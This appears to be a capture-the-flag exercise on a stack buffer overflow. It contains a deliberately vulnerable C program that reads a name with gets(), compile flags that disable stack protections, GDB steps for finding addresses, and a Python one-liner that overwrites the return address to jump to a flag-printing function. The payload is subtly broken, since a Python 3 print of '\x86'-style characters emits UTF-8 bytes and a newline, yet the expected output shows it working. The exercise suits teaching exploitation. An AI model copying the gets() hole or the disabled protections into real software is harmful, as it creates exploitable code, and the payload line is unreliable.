# Challenge: Unlock the Flag (Overflow Exercise)

## Description

You are given the following vulnerable C program:

```c
#include <stdio.h>
#include <string.h>

void you_win() {
    printf("Congratulations! Here is your flag: FLAG{gdb_master}\n");
}

void vuln() {
    char name[24];
    printf("Enter your name: ");
    gets(name);
    printf("Nice to meet you, %s\n", name);
}

int main() {
    vuln();
    return 0;
}
```

---

## 🛠Compilation

Compile the program with the following options to disable protections and include debugging information:

```bash
gcc -g -fno-stack-protector -z execstack -no-pie unlock_flag.c -o unlock_flag
```

| Option | Purpose |
|--------|---------|
| `-g` | Include debug symbols for GDB |
| `-fno-stack-protector` | Disable stack canary (overflow protection) |
| `-z execstack` | Allow execution from the stack (optional for this case) |
| `-no-pie` | Disable address randomization (fixed function addresses) |
| `-o unlock_flag` | Output executable file name |

---

## Debugging with GDB

Launch the debugger:

```bash
gdb ./unlock_flag
```

### Inside GDB:

| Command | Description |
|---------|-------------|
| `break vuln` | Set a breakpoint at the start of `vuln()` |
| `run` | Start the program and stop at the breakpoint |
| `print you_win` | Print the address of the function `you_win()` |
| `info frame` | Show stack frame info (including return address location) |
| `print &name` | Show buffer start address |
| `x/20xb $rsp` | Examine 20 bytes at the current stack pointer |
| `quit` | Exit GDB |

---

## Exploit the Buffer Overflow

- The buffer `name[24]` is followed by 8 bytes for the saved base pointer.
- The return address is located at **offset 32**.
- Use the address of `you_win()` (in little endian format) to overwrite the return address.

Example:

```bash
python3 -c "print('A'*32 + '\x86\x11\x40\x00\x00\x00\x00\x00')" | ./unlock_flag
```

> Replace `\x86\x11\x40...` with the actual address found using GDB.

---

## Little Endian Reminder

To convert a 64-bit address (e.g. `0x401186`) into little endian format:

```
0x401186 → \x86\x11\x40\x00\x00\x00\x00\x00
```

The least significant byte comes first.

---

## Expected Output

```
Enter your name: Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Congratulations! Here is your flag: FLAG{gdb_master}
Segmentation fault (core dumped)
```

The segmentation fault is expected after the function finishes, as there is no valid return address.

---

Remember: precision matters in memory!
